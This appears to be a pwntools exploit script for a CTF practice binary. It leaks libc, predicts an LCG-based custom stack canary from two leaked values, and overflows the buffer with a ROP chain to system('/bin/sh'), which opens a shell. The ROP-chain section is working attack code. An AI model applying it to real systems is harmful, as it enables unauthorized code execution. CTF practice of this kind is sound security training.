'''
FULL RELRO, NX, PIE, SHSTK, IBT 적용됨
문제 푸는 방향 -> 스캑 카나리와 같은 느낌으로 미나리가 존재
미나리값이 while문 안에서 돌때마다 계속 바뀜으로, 다음 미나리값 예측이 필요
-> lcg여서 예측이 가능하다!!!
PIE가 적용되어 있어서, PIE의 base address를 알아내야함
미나리값 예측 후, BOF로 ROP chain 구성 
'''
#only using libray
from pwn import *
from Crypto.Util.number import inverse
context.arch='amd64'
context.log_level='debug'
#context.terminal = ['tmux', 'splitw', '-h']


#p = remote("host3.dreamhack.games",22544)
p = process("./prob")
gdb.attach(p)
e = ELF("./prob")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") # libc 파일 경로
rop = ROP(libc) # ROP 객체 생성

# 복귀주소 leak
p.recvuntil(b"Enter a string > ")
payload = b"A" *264 #미니라가 있는 영역 전까지
p.send(payload)
p.recvuntil(payload)
ret_addr = u64(p.recvn(6).ljust(8,b'\x00'))  # 복귀주소 leak
offset = 0x21ca + 0x28000
libc.address = ret_addr - offset # 라이브러리의 베이스 주소를 아예 라이브러리의 시작주소로 잡기
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0] + libc.address
ret = rop.find_gadget(['ret'])[0] + libc.address
binsh = next(libc.search(b'/bin/sh'))
system = libc.symbols['system']

log.info(f"libc_base {hex(libc.address)}")
log.info(f"pop rdi; ret; {hex(pop_rdi)}")
log.info(f"ret; {hex(ret)}")
log.info(f"binsh {hex(binsh)}")
log.info(f"system {hex(system)}")
log.info(f"system pwntools {hex(libc.symbols['system'])}")


# 다음 미나리 값 예측을 위한 미나리값 leak 1
p.recvuntil(b"Enter a string > ")
payload = b"A" *248 #미니라가 있는 영역 전까지
p.send(payload)
p.recvuntil(payload)

minary = u64(p.recvn(8)) #미니라 값 받기
x1 = (minary >> 32)& 0xFFFFFFFF # 미니라 값의 상위 32비트
x2 = minary & 0xFFFFFFFF # 미니라 값의 하위 32비트

#로깅
log.info(f"minary: {hex(minary)}")
log.info(f"x1(high) : {hex(x1)}")
log.info(f"x2(low): {hex(x2)}")

# 다음 미나리 값 예측을 위한 미나리값 leak 2
p.recvuntil(b"Enter a string > ")
payload = b"A" *248 #미니라가 있는 영역 전까지
p.send(payload)
p.recvuntil(payload)

minary = u64(p.recvn(8)) #미니라 값 받기
x3 = (minary >> 32)& 0xFFFFFFFF # 미니라 값의 상위 32비트
x4 = minary & 0xFFFFFFFF # 미니라 값의 하위 32비트
#로깅
log.info(f"minary: {hex(minary)}")
log.info(f"x3(high) : {hex(x3)}")
log.info(f"x4(low) : {hex(x4)}")
log.info(f"ret_addr: {hex(ret_addr)}")

# 다음 미나리 값 예측
m = 1<<32
if (x2 - x1)%2 == 0: # 역원 계산 불가능 다시 돌려
    print("미나리값 예측 불가")
    exit(1)
mul = ((x3 - x2)*inverse((x2-x1),m))% m
inc = (x2 - mul * x1) % m
x5 = ((mul * x4) + inc) % m # 다음 미나리 값 예측
x6 = ((mul * x5) + inc) % m # 다음 미나리 값 예측
minary=(x5<<32|x6)# 다음 미나리 값
log.info(f"mul: {hex(mul)}")
log.info(f"inc: {hex(inc)}")
log.info(f"minary high: {hex(x5)}")
log.info(f"minary low: {hex(x6)}")
log.info(f"predicted minary: {hex(minary)}")

p.recvuntil(b"Enter a string > ")
# ROP chain 구성 ROP chain 구성
payload = b"quit"
payload += b"A" *244 # 미니라가 있는 영역 전까지
payload += p64(minary) # 미나리 값
payload += p64(1) # sfp 덮어쓰기
payload += p64(ret) # pop rdi; ret 가젯의 주소
payload += p64(pop_rdi) # pop rdi; ret 가젯의 주소
payload += p64(binsh) # "/bin/sh" 문자열의 절대 주소
payload += p64(system) # system 함수의 절대 주소

p.send(payload)
p.recvuntil(b"Goodbye!")
p.sendline(b'ls')
p.interactive()
